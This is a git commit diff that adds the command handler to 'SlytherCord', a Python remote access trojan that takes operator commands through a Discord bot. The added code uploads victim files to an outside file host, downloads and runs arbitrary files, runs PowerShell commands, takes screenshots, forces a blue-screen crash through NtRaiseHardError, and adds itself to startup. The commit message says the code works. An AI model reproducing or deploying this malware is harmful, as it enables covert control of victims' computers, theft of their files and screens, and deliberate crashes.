b459560ac8fab11d08fb3f1a32ba1a785adefd26
Isaac Lins <isaac.lins07@gmail.com>
2023-07-11 11:58:26 +0200

    Update SlytherCord.py to contain old code (which btw works ;))

--- SlytherCord/SlytherCord.py
+++ SlytherCord/SlytherCord.py
@@ -4,7 +4,20 @@ from settings import *
 
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(6).hex()
-
+commands = "\n".join([
+    "help - Help Command",
+    "ping - Ping Command",
+    "cd - Change Directory",
+    "ls - List Directory",
+    "download <file> - Download File",
+    "upload <link> - Upload File",
+    "cmd - Execute CMD Command",
+    "run <file> - Run an File",
+    "screenshot - Take a Screenshot",
+    "blue - DeadScreen",
+    "start - Add To start",
+    "exit - Exit The Session",
+])
 guild = client.get_guild(int(guild_id))
 channel = guild.create_text_channel(session_id)
 
@@ -14,6 +27,97 @@ async def on_ready():
     
 @client.event
 async def on_message(message):
-    await channel.send("aight")
+    if message.author == client.user:
+        return
+
+    if message.channel.name != session_id:
+        return
+
+    if message.content == "help" or message.content == "Help":
+        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content == "ping" or message.content == "Ping":
+        embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("cd") or message.content.startswith("Cd"):
+        directory = message.content.split(" ")[1]
+        try:
+            os.chdir(directory)
+            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
+        except:
+            embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content == "ls" or message.content == "Ls":
+        files = "\n".join(os.listdir())
+        if files == "":
+            files = "No Files Found"
+        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("download") or message.content.startswith("Download"):
+        file = message.content.split(" ")[1]
+        try:
+            link = requests.post("https://api.letsupload.cc/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
+            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
+            await message.reply(embed=embed)
+        except:
+            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
+            await message.reply(embed=embed)
+
+    if message.content.startswith("upload") or message.content.startswith("Upload"):
+        link = message.content.split(" ")[1]
+        file = requests.get(link).content
+        with open(os.path.basename(link), "wb") as f:
+            f.write(file)
+        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("shell") or message.content.startswith("Shell"):
+        command = message.content.split(" ")[1]
+        output = subprocess.Popen(
+            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+        ).communicate()[0].decode("utf-8")
+        if output == "":
+            output = "No output"
+        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("run") or message.content.startswith("Run"):
+        file = message.content.split(" ")[1]
+        subprocess.Popen(file, shell=True)
+        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
+        await message.reply(embed=embed)
+
+    if message.content.startswith("exit"):
+        await message.channel.delete()
+        await client.close()
+    
+    if message.content.startswith("start"):
+        await message.reply("Ok Boss")
+        await start()
+        
+    if message.content.startswith("blue") or message.content.startswith("Blue"):
+        await message.reply("Attempting...", delete_after = .1)
+        ntdll = ctypes.windll.ntdll
+        prev_value = ctypes.c_bool()
+        res = ctypes.c_ulong()
+        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+            await message.reply("Blue Successful!")
+        else:
+            await message.reply("Blue Failed! :(")
+
+    if message.content.startswith("screenshot"):
+        screenshot = pyautogui.screenshot()
+        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+        screenshot.save(path)
+        file = discord.File(path)
+        embed = discord.Embed(title="Screenshot", color=0xfafafa)
+        embed.set_image(url="attachment://screenshot.png")
+        await message.reply(embed=embed, file=file)
+        
 
 client.run(bot_token)
